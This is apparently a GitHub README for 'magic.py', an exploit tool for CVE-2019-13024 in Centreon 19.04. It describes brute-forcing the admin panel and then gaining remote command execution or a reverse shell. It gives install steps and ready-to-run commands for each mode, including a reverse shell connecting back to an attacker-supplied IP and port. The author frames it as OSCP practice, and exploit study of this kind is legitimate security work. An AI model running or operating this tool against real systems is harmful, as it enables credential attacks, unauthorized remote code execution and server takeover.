<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/magic.png" width="400">

### Centron 19.04 Brute Force and RCE - CVE-2019-13024

Due to improper control of failed logins it is possible to attempt to brute force the administration panel of Centreon 19.04, and then make use of unsanitized variable control to execute remote commands on the targets server. This version of the exploit includes the brute force mode, to attempt to get credentials, then a choice between an arbitary command execution or a straight attempt to get a reverse shell.

--------------

### Installation
From within your Linux terminal, you can use the following command to download the program.

```bash
git clone https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE.git
```

We need to make sure you have the packages installed that the program requires before it will run.

First, install pip, which is a package manager for Python.
```bash
sudo apt install python-pip
```

Then, we install the required libraries.
```bash
pip install colorama art bs4 urllib3 requests
```

This is all the prerequisites you need! 

### Usage

Magic makes use of the ArgParse library, meaning you can get the help menu to appear by typing:
```bash
python magic.py -h
```

<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/menu.PNG" width="800">



#### Brute Force Mode

```bash
python magic.py -t 10.10.10.10 -p 80 -m 1
```
<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/brute.png" width="800">



#### RCE Mode

```bash
python magic.py -t 10.10.10.10 -p 80 -m 2
```

<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/rce.png" width="800">




#### Reverse Shell Mode

Note: You must start your own listener to connect back to.
```bash
python magic.py -t 10.10.10.10 -p 80 -m 3 -i 192.168.69.1 -l 443
```
<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/shell.png" width="800">


### License and Credits

Code is open source and I welcome feedback, comments and requests. I wrote this in order to try to improve my usage of classes in Python, and as practice for my OSCP custom exploitation attempts.

Originally, @mhasker wrote and discovered the exploit. I just added a brute forcer, the option to execute alternative commands, and shazam with the colours. I've linked his github below - great work.

[mhasker](https://github.com/mhaskar/CVE-2019-13024)
--------

<img src="https://github.com/0xskunk/Resource-Program-for-Cyber-Students/blob/master/images/0xskunk1.PNG" width="250">

[Logo created with LogoMakr](https://my.logomakr.com/)
